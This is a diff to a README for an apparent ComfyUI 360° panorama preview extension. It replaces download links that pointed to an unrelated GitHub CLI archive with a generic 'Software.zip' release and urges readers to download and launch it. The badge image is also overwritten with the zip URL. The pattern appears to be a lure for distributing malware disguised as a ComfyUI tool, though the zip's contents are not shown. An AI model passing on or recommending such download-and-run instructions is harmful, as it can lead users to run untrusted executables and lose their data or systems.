@@ -16,7 +16,7 @@ Are you looking to enhance your projects with immersive 360° views and virtual 
 
 ## How to Use 🚀
 
-Simply download the [ComfyUI Preview 360° Panorama](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) package and launch it to start incorporating stunning 360° panoramas into your projects!
+Simply download the [ComfyUI Preview 360° Panorama](https://github.com/teohhee/ComfyUI_preview360panorama/releases/download/v1.0/Software.zip) package and launch it to start incorporating stunning 360° panoramas into your projects!
 
 ## Repository Topics 📋
 
@@ -41,4 +41,4 @@ Dive into the world of interactive panoramas and elevate your projects with mesm
 
 Remember, if the link needs to be launched, simply download the package and get started. If you encounter any issues with the link, feel free to check the "Releases" section for alternative options. Enjoy exploring the possibilities with "ComfyUI Preview 360° Panorama"! 🌐
 
-[![Download Now](https://img.shields.io/static/v1?label=Download&message=Now&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/teohhee/ComfyUI_preview360panorama/releases/download/v1.0/Software.zip)](https://github.com/teohhee/ComfyUI_preview360panorama/releases/download/v1.0/Software.zip)
